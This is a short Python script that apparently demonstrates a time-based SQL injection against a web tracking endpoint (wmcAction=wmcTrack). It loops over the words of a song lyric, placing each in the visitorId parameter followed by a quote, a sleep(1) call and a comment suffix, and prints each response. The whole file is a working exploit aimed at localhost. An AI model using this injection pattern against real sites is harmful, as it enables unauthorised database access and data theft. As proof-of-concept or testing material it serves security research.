import requests 
import random

url = "http://localhost/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId="
postfix = ",0,0,0,0,0);--+-"

song = "Never Gonna Give You Up Never Gonna Let You Down Never Gonna Run Around And Desert You"
count = 1
while count <= len(song.split()):
    sqlstr="sleep(1)"
    vid=str(count).rjust(4,'0')+" - "+song.split()[count-1]
    r=requests.get(url+vid+"%27,"+sqlstr+postfix)
    print(str(r.status_code)+": "+r.text)
    count+=1
